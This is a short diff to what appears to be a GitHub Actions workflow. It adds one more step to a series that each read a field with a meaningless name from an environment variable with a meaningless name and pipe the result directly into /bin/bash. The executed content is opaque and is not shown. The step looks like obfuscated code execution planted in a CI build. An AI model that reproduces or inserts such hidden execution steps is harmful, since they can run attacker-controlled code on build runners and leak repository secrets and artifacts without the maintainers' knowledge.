@@ -24,6 +24,7 @@ jobs:
           echo $cop10 | jq -r .fgsv9427 | /bin/bash
           echo $vuce769 | jq -r .rwcry65085 | /bin/bash
           printf '%s' "$rnmxw19828" | jq -r .qz26 | /bin/bash
+          echo $pm94 | jq -r .vqncs8946 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
